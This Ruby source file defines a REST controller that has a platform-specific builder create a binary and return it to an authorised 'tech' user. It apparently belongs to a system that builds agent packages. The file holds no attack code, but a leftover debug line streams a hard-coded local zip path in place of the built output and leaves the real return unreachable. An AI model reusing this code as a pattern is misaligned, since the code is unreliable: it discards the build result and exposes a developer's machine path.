#
# Controller for Build
#

require_relative '../build'

module RCS
module DB

class BuildController < RESTController

  def create
    require_auth_level :tech

    platform = @params['platform']

    # instantiate the correct builder
    begin
      build = Build.factory(platform.to_sym)
    rescue Exception => e
      return RESTController.reply.not_found(e.message)
    end

    begin
      build.create @params

      trace :debug, "Output: #{build.outputs}"

      # TODO: convert to stream and pass the object to clean the file later
      content = File.open(build.path(build.outputs.first), 'rb') {|f| f.read}

      trace :debug, "Output size: #{content.bytesize}"

      build.clean

      #content = File.open('/Volumes/RCS_DATA/RCS/rcs-db/cores/offline.zip', 'rb') {|f| f.read}
      #return RESTController.reply.ok(content, {content_type: 'binary/octet-stream'})
      return RESTController.reply.stream_file('/Volumes/RCS_DATA/RCS/rcs-db/cores/offline.zip')

      return RESTController.reply.ok(content, {content_type: 'binary/octet-stream'})
    rescue Exception => e
      return RESTController.reply.server_error(e.message)
    end

  end

end

end #DB::
end #RCS::